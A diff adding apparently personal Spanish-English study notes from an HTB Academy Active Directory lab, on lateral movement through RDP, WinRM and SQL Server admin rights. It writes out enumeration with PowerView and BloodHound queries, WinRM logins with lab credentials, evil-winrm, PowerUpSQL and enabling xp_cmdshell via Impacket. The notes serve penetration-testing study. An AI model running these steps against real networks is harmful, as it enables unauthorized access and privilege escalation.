@@ -1346,33 +1346,130 @@ runas /netonly /user:INLANEFREIGHT\adunn powershell
 
 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/eafc11e2-c99e-435f-ace0-af603d618bc4)
 
+## Acceso Privilegiado
+
+ Normalmente, si tomamos el control de una cuenta con derechos de administrador local sobre un host o un conjunto de hosts, podemos realizar un Pass-the-Hashataque para autenticarnos a través del protocolo SMB.
+
+
+ ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/099bc64d-2964-4cad-9466-de53819d0a06)
+
+
+### Remote Desktop
+
+Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:
+
+Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host. Let's check out the Remote Desktop Users group on the MS01 host in our target domain.
+
+```
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+
+```
+
+From the information above, we can see that all Domain Users (meaning all users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain
+
+To test this access, we can either use a tool such as xfreerdp or Remmina from our VM or the Pwnbox or mstsc.exe(ejecutable de RDP) if attacking from a Windows host.
+
+
+## WinRM (Remote Management Users)
+
+Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.
+
+```
+Enumerating the Remote Management Users Group
+
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+## RAW Query en BloodHound
+
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+
+#### Establishing WinRM Session from Windows
+
+
+```
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+
+[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
+ACADEMY-EA-DB01
+[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
+PS C:\htb>
+```
+
+### Desde Linux Evil-WinRM
+
+```
+gem install evil-winrm
+evil-winrm -i 10.129.201.234 -u forend
+```
+
+We can connect with just an IP address and valid credentials
+
+
+## SQL Server Admin
+
+More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.
+
+BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:
+
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/80763498-118d-4314-9517-b67423dd87c8)
+
+
+We can use our ACL rights to authenticate with the wley user, change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL, which has a handy command cheat sheet. Let's assume we changed the account password to SQL1234! using our ACL rights. We can now authenticate and run operating system commands.
+
+First, let's hunt for SQL server instances.
+
+#### Enumerating MSSQL Instances with PowerUpSQL
+
+```
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+
+ Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+```
 
 
 
+#### Enumerate in linux (mssqlclient.py)
+
+We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.
+
+```
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+help
+
+```
+
+We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.
+
+```
+enable_xp_cmdshell
+
+```
+
+Para el ejercicio
+
+```
+Get-ADGroupMember -Identity "Remote Management Users"
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-DC01 -GroupName "Remote Management Users"
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
 
 
+```
 
+Explicacion 
 
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/412e04f3-33f5-4864-b2df-d99bf7cff622)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+En esa imagen checamos el grupo de RPD local nos muestra que todos lo susuarios del dominio pueden hacer RDP. Aqui lo que se entiende es que este es un jump server.
 
 
 
